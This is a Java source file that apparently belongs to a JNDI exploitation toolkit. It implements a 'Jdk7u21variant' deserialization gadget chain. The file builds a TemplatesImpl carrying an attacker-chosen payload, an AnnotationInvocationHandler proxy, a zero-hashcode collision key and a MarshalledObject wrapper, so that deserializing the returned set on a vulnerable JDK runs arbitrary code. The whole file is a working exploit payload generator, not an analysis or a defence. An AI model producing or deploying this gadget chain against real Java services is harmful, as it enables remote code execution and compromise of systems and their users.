package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.annotation.Authors;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import com.nu1r.jndi.gadgets.utils.Reflections;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.rmi.MarshalledObject;
import java.util.HashMap;
import java.util.LinkedHashSet;

@Authors({"potats0"})
public class Jdk7u21variant implements ObjectPayload<Object>{

    public Object getObject(PayloadType type, String... param) throws Exception {
        Object templates = Gadgets.createTemplatesImpl(type, param);
        String zeroHashCodeStr = "f5a5a608";

        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");

        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
        Reflections.setFieldValue(tempHandler, "type", Templates.class);
        Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);

        LinkedHashSet set = new LinkedHashSet();
        set.add(templates);
        set.add(proxy);

        Reflections.setFieldValue(templates, "_auxClasses", null);
        Reflections.setFieldValue(templates, "_class", null);

        map.put(zeroHashCodeStr, templates);

        MarshalledObject marshalledObject = new MarshalledObject(set);
        Reflections.setFieldValue(tempHandler, "type", MarshalledObject.class);

        set = new LinkedHashSet(); // maintain order
        set.add(marshalledObject);
        set.add(proxy);
        map.put(zeroHashCodeStr, marshalledObject); // swap in real object
        return set;
    }
}
